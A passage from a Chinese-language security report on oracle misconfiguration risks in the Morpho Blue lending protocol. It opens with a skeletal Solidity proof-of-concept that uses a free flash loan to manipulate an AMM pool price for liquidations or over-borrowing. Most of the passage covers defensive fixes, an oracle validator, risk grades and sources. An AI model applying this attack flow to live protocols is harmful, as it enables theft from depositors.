    bytes32 public targetMarketId;

    // 攻击流程
    function attack() external {
        // Step 1: 利用 Morpho Blue 的免费闪电贷借入大量资金
        morpho.flashLoan(
            address(0xUSDC),
            30_000_000e6, // $30M
            abi.encode("ATTACK")
        );
    }

    // Step 2: 闪电贷回调
    function onMorphoFlashLoan(uint256 amount, bytes calldata) external {
        // Step 3: 在 Oracle 依赖的 AMM 池中大额交易
        // 操纵瞬时价格（或短时 TWAP）
        targetPool.swap(
            address(this),
            true, // zeroForOne
            int256(amount),
            0, // sqrtPriceLimitX96
            ""
        );

        // Step 4: 此时 AMM 池价格已被操纵
        // Oracle.price() 返回被操纵的价格

        // Step 5a: 如果价格被低估 → 清算其他用户的仓位
        // morpho.liquidate(targetMarketId, victim, ...);

        // Step 5b: 如果价格被高估 → 用少量抵押品借出大量资产
        // morpho.supplyCollateral(...);
        // morpho.borrow(...);

        // Step 6: 反向交易恢复 AMM 池价格
        // Step 7: 归还闪电贷

        // 注意: Morpho Blue 闪电贷完全免费
        // 攻击者只需支付 AMM 交易手续费
    }
}
```

---

## 8. 防御建议

### 8.1 协议层面 (Morpho Labs)

#### P0 — 立即行动

**建议 1: MorphoChainlinkOracleV2 自动获取 token decimals**

```solidity
// ✅ 修改后的 constructor — 自动获取 decimals
constructor(
    IERC4626 baseVault,
    uint256 baseVaultConversionSample,
    AggregatorV3Interface baseFeed1,
    AggregatorV3Interface baseFeed2,
    address baseToken,        // ← 改为传入 token 地址
    IERC4626 quoteVault,
    uint256 quoteVaultConversionSample,
    AggregatorV3Interface quoteFeed1,
    AggregatorV3Interface quoteFeed2,
    address quoteToken        // ← 改为传入 token 地址
) {
    // ✅ 自动获取 decimals，消除人为错误
    uint256 baseTokenDecimals = IERC20Metadata(baseToken).decimals();
    uint256 quoteTokenDecimals = IERC20Metadata(quoteToken).decimals();

    // ✅ 合理性断言
    require(baseTokenDecimals <= 24, "BASE_DECIMALS_TOO_HIGH");
    require(quoteTokenDecimals <= 24, "QUOTE_DECIMALS_TOO_HIGH");

    SCALE_FACTOR = 10 ** (
        36 + quoteTokenDecimals + quoteFeed1.decimals() + quoteFeed2.decimals()
           - baseTokenDecimals - baseFeed1.decimals() - baseFeed2.decimals()
    ) * quoteVaultConversionSample / baseVaultConversionSample;

    // ✅ SCALE_FACTOR 合理性检查
    require(SCALE_FACTOR >= 1e6, "SCALE_FACTOR_TOO_LOW");
    require(SCALE_FACTOR <= 1e60, "SCALE_FACTOR_TOO_HIGH");
}
```

**建议 2: 创建 Oracle 验证器合约**

```solidity
// ✅ OracleValidator.sol — 部署前验证 Oracle 配置
contract OracleValidator {

    /// @notice 验证 Oracle 价格是否与外部参考价格一致
    /// @param oracle Morpho Blue 使用的 Oracle 地址
    /// @param referencePrice 链外已知的市场价格 (36 decimals)
    /// @param maxDeviationBps 最大允许偏差 (basis points, e.g., 500 = 5%)
    function validateOracle(
        address oracle,
        uint256 referencePrice,
        uint256 maxDeviationBps
    ) external view returns (bool valid, uint256 oraclePrice, uint256 deviationBps) {
        oraclePrice = IOracle(oracle).price();

        if (oraclePrice > referencePrice) {
            deviationBps = (oraclePrice - referencePrice) * 10000 / referencePrice;
        } else {
            deviationBps = (referencePrice - oraclePrice) * 10000 / referencePrice;
        }

        valid = deviationBps <= maxDeviationBps;
    }

    /// @notice 验证 Oracle 返回的价格数量级是否合理
    /// @dev 防止 10^12 倍级别的配置错误
    function validatePriceOrder(
        address oracle,
        uint256 expectedOrderOfMagnitude  // e.g., 1e27 for ~$2600 asset
    ) external view returns (bool valid, uint256 ratio) {
        uint256 price = IOracle(oracle).price();
        ratio = price > expectedOrderOfMagnitude
            ? price / expectedOrderOfMagnitude
            : expectedOrderOfMagnitude / price;

        // 价格与预期不应偏差超过 100 倍
        valid = ratio <= 100;
    }
}
```

#### P1 — 短期改进

**建议 3: IOracle 接口增强**

```solidity
// ✅ IOracle V2 — 增加安全方法
interface IOracleV2 {
    function price() external view returns (uint256);

    /// @notice 返回价格有效的时间戳
    function lastUpdated() external view returns (uint256);

    /// @notice 返回 Oracle 描述 (e.g., "PAXG/USDC")
    function description() external view returns (string memory);

    /// @notice 返回价格精度
    function priceDecimals() external view returns (uint8);
}
```

**建议 4: Morpho.sol 添加可选的价格断路器**

```solidity
// ✅ 可选的价格断路器 — 不破坏现有 permissionless 设计
contract MorphoWithCircuitBreaker is Morpho {
    // 市场创建者可选择启用价格断路器
    mapping(Id => PriceGuard) public priceGuards;

    struct PriceGuard {
        uint256 minPrice;        // Oracle 价格下限
        uint256 maxPrice;        // Oracle 价格上限
        uint256 maxChangePerTx;  // 单交易最大价格变化 (bps)
        uint256 lastPrice;       // 上次记录的价格
        bool enabled;
    }

    function setPriceGuard(
        MarketParams memory marketParams,
        uint256 minPrice,
        uint256 maxPrice,
        uint256 maxChangePerTx
    ) external {
        // 只有市场创建者可设置（或任何人，因为只会增加安全性）
        Id id = marketParams.id();
        priceGuards[id] = PriceGuard({
            minPrice: minPrice,
            maxPrice: maxPrice,
            maxChangePerTx: maxChangePerTx,
            lastPrice: IOracle(marketParams.oracle).price(),
            enabled: true
        });
    }

    function _validatePrice(Id id, uint256 price) internal {
        PriceGuard storage guard = priceGuards[id];
        if (!guard.enabled) return;

        require(price >= guard.minPrice, "PRICE_TOO_LOW");
        require(price <= guard.maxPrice, "PRICE_TOO_HIGH");

        if (guard.lastPrice > 0) {
            uint256 change = price > guard.lastPrice
                ? (price - guard.lastPrice) * 10000 / guard.lastPrice
                : (guard.lastPrice - price) * 10000 / guard.lastPrice;
            require(change <= guard.maxChangePerTx, "PRICE_CHANGE_TOO_LARGE");
        }

        guard.lastPrice = price;
    }
}
```

### 8.2 Vault Curator 层面

| # | 建议 | 优先级 |
|---|------|:---:|
| 1 | **部署新 Oracle 前，使用 OracleValidator 验证价格与 CoinGecko/CMC 偏差 < 1%** | 🔴 P0 |
| 2 | **从 WithdrawQueue 完全移除不使用的市场（不仅仅 cap=0）** | 🔴 P0 |
| 3 | **只使用 MorphoChainlinkOracleV2 等经过审计的 Oracle 实现** | 🔴 P0 |
| 4 | **V2: 使用多维度 Cap 限制单一 Oracle 类型的总暴露量** | 🟠 P1 |
| 5 | **部署自动化监控: oracle price vs market price 偏差告警** | 🟠 P1 |
| 6 | **对新增市场设置冷却期，避免立即大量存入** | 🟡 P2 |

### 8.3 用户/LP 层面

| # | 建议 | 优先级 |
|---|------|:---:|
| 1 | **仅存入 Curated Vault（如 Gauntlet、Steakhouse）而非裸露市场** | 🔴 P0 |
| 2 | **验证市场的 Oracle 是否使用了 Chainlink/Pyth 等可信源** | 🔴 P0 |
| 3 | **检查 Morpho UI 的风险标签 (RED/YELLOW/BLACKLISTED)** | 🟠 P1 |
| 4 | **避免存入新创建的市场（等待至少 7 天观察期）** | 🟠 P1 |

---

## 9. 综合评估

### 安全评分

| 组件 | 评分 | 说明 |
|------|:---:|------|
| Morpho.sol 核心合约 | **A** | 极简设计，经过多方审计和形式化验证 |
| MorphoChainlinkOracleV2 | **B** | 功能正确但缺少自动 decimals 获取 |
| 无许可市场创建机制 | **C+** | 设计上将安全责任外包，已导致 $230K 损失 |
| MetaMorpho Vault V1 | **B-** | 存在 faulty oracle 边缘情况 |
| MetaMorpho Vault V2 | **B+** | 多维度 Cap 和 Sentinel 角色显著改进 |
| IOracle 接口 | **C** | 过度简化，缺少关键安全方法 |

### 总体评级: **B**

```
Morpho Blue 的安全范式:
┌─────────────────────────────────────────────────────────┐
│                                                         │
│  核心合约代码质量: ★★★★★ (极高)                        │
│  安全架构设计:     ★★★☆☆ (将风险外包)                 │
│  Oracle 安全防护:  ★★☆☆☆ (几乎无防护)                 │
│  已知漏洞修复:     ★★★☆☆ (仅 UI 层面告警)            │
│  系统性风险管理:   ★★★★☆ (V2 显著改善)                │
│                                                         │
│  核心矛盾:                                              │
│  "代码是安全的，但使用代码的人不一定安全"                │
│                                                         │
│  Morpho Blue 将安全责任从协议层下放到:                  │
│  → 市场创建者 (Oracle 配置)                             │
│  → Vault Curator (市场选择)                             │
│  → 最终用户 (存款决策)                                  │
│                                                         │
│  这种设计提供了最大的灵活性，                            │
│  但也意味着每个参与者都需要成为安全专家                  │
│  — 这在实践中是不现实的。                                │
│                                                         │
│  与 Moonwell 的核心共性:                                │
│  "人类配置错误是 DeFi 安全最大的敌人"                   │
│                                                         │
└─────────────────────────────────────────────────────────┘
```

### 与 Moonwell 漏洞的最终对比结论

```
              Moonwell                    Morpho Blue
              ─────────                   ──────────
错误来源      治理提案                     市场部署者
验证机制      无 Oracle 价格检查            无 Oracle 验证
错误类型      遗漏 ETH/USD 乘数            SCALE_FACTOR 小数位不匹配
根因相同      ✅ 人为配置错误 + 缺少自动化验证
是否已发生    ✅ $1.78M (2026-02)          ✅ $230K (2024-10)
是否可重复    ⚠️ 其他治理提案              ❌ 可无限重复 (无许可创建)
修复机制      治理投票 (5天)               不可修改 (永久)

关键结论:
Morpho Blue 存在与 Moonwell 完全相同模式的 Oracle 配置错误漏洞，
且由于无许可创建机制，此漏洞可以反复出现在不同的市场中。
虽然隔离市场设计限制了单次损失的上限，
但系统性地缺少 Oracle 验证意味着同类攻击将持续发生。
```

---

## 数据来源

- [Morpho Blue GitHub](https://github.com/morpho-org/morpho-blue) — 核心合约源码
- [Morpho Blue Oracles GitHub](https://github.com/morpho-org/morpho-blue-oracles) — Oracle 实现
- [Morpho Docs - Oracle](https://docs.morpho.org/learn/concepts/oracle/) — Oracle 文档
- [Morpho Docs - Risk](https://docs.morpho.org/learn/resources/risks) — 风险文档
- [Morpho Docs - Security Considerations for Curators](https://docs.morpho.org/curate/concepts/security-considerations/) — Curator 安全指南
- [Verichains: Morpho Protocol Market Oracle Price Exploit](https://blog.verichains.io/p/morpho-protocol-market-oracle-price) — PAXG 攻击技术分析
- [Coinmonks: Decoding MorphoBlue's $230K Exploit](https://medium.com/coinmonks/decoding-morphoblues-230k-exploit-6296565ced40) — 攻击解码
- [The Defiant: Morpho User Exploits Oracle Error](https://thedefiant.io/news/defi/morpho-user-exploits-oracle-error-to-turn-usd350-into-usd230k) — 攻击报道
- [Morpho Blog: Risk Warnings](https://morpho.org/blog/introducing-risk-warnings-transitioning-to-a-permissionless-interface/) — 风险告警系统
- [LlamaRisk: Morpho Vaults Risk Disclaimer](https://llamarisk.com/research/morpho-vaults-risk-disclaimer) — 风险评估
- [Morpho Immunefi Bug Bounty](https://immunefi.com/bug-bounty/morpho/) — Bug Bounty 计划
- [07_real_hack_analysis_2026.md](./07_real_hack_analysis_2026.md) — Moonwell/sDOLA 攻击参考

---

*本报告用于安全研究和防御目的。所有 PoC 代码仅演示漏洞原理，不应用于恶意攻击。*
